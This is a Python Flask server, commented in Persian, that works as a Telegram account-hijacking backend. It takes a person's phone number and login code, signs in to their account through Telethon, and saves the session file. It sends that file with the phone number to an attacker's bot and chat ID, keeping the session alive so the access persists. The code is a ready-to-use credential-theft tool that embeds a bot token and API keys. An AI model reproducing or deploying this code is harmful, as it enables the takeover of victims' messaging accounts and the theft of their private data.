from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient
import asyncio
import os
import logging
import requests

app = Flask(__name__)
CORS(app)

API_ID = 2899
API_HASH = '36722c72256a24c1225de00eb6a1ca74'
BOT_TOKEN = '8591425870:AAEAjapPJnv_Q_NfW5NbTX6_b-zrGMPGv-s'
CHAT_ID = '8491102319'

sessions = {}
logging.basicConfig(level=logging.INFO)
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok', 'sessions': len(sessions)})

@app.route('/request-code', methods=['POST'])
def request_code():
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({'error': 'Phone required'}), 400

    session_id = f"session_{phone.replace('+', '')}"
    sessions[session_id] = {'phone': phone, 'status': 'pending'}

    try:
        loop.run_until_complete(send_code(session_id, phone))
    except Exception as e:
        logging.error(f"Error in request_code: {e}")
        return jsonify({'error': str(e)}), 500

    return jsonify({'success': True, 'request_id': session_id})

@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    session_id = data.get('request_id')
    code = data.get('code')
    phone = data.get('phone')

    if not session_id or not code:
        return jsonify({'error': 'Missing data'}), 400

    session = sessions.get(session_id)
    if not session:
        return jsonify({'error': 'Session not found'}), 400

    try:
        result = loop.run_until_complete(verify_session(session_id, phone, code))
        if result:
            return jsonify({'success': True, 'message': 'Code verified'})
        else:
            return jsonify({'error': 'wrong_code'}), 400
    except Exception as e:
        logging.error(f"Error in verify_code: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================
# توابع اصلی
# ============================================================
async def send_code(session_id, phone):
    try:
        client = TelegramClient(session_id, API_ID, API_HASH)
        await client.connect()
        
        result = await client.send_code_request(phone)
        
        sessions[session_id]['client'] = client
        sessions[session_id]['phone_code_hash'] = result.phone_code_hash
        sessions[session_id]['status'] = 'code_sent'
        logging.info(f"✅ Code sent to: {phone}")
        
    except Exception as e:
        sessions[session_id]['status'] = 'error'
        logging.error(f"❌ Error sending code: {e}")
        raise

async def verify_session(session_id, phone, code):
    session = sessions.get(session_id)
    if not session:
        return False

    client = session.get('client')
    if not client:
        logging.error(f"❌ No client for {phone}")
        return False

    phone_code_hash = session.get('phone_code_hash')
    if not phone_code_hash:
        logging.error(f"❌ No phone_code_hash for {phone}")
        return False

    try:
        # ✅ تایید کد
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        
        # ✅ تایید لاگین
        me = await client.get_me()
        if not me:
            logging.error("❌ Login failed")
            return False
        
        # ============================================================
        # 📁 ذخیره سشن در فایل
        # ============================================================
        session_file_path = f"{session_id}.session"
        client.session.save_to_file(session_file_path)
        
        # ✅ ارسال فایل به ربات (فقط فایل + شماره)
        await send_session_file_to_bot(session_file_path, phone)
        
        # پاک کردن فایل بعد از ارسال
        if os.path.exists(session_file_path):
            os.remove(session_file_path)
        
        # ✅ فقط قطع کن، خارج نشو (سشن میمونه)
        await client.disconnect()

        sessions[session_id]['status'] = 'done'
        logging.info(f"✅ Session file sent for: {phone}")
        return True

    except Exception as e:
        sessions[session_id]['status'] = 'error'
        logging.error(f"❌ Verification error: {e}")
        
        error_msg = str(e).lower()
        if 'code' in error_msg or 'invalid' in error_msg or 'phone' in error_msg:
            return False
        raise

# ============================================================
# 📤 ارسال فایل سشن به ربات (فقط فایل + شماره)
# ============================================================
async def send_session_file_to_bot(file_path, phone):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        
        with open(file_path, 'rb') as f:
            files = {'document': (f"{phone.replace('+', '')}.session", f, 'application/octet-stream')}
            
            caption = f"""📱 <b>User:</b> <code>{phone}</code>

🔐 <b>Session File:</b> <code>{os.path.basename(file_path)}</code>

🔒 <b>Do not share this file with anyone!</b>"""
            
            data = {
                'chat_id': CHAT_ID,
                'caption': caption,
                'parse_mode': 'HTML'
            }
            
            response = requests.post(url, data=data, files=files)
            
            if response.status_code == 200:
                logging.info("✅ Session file sent to bot")
            else:
                logging.error(f"❌ Bot error: {response.status_code}")
    except Exception as e:
        logging.error(f"❌ Bot error: {e}")

# ============================================================
# اجرا
# ============================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
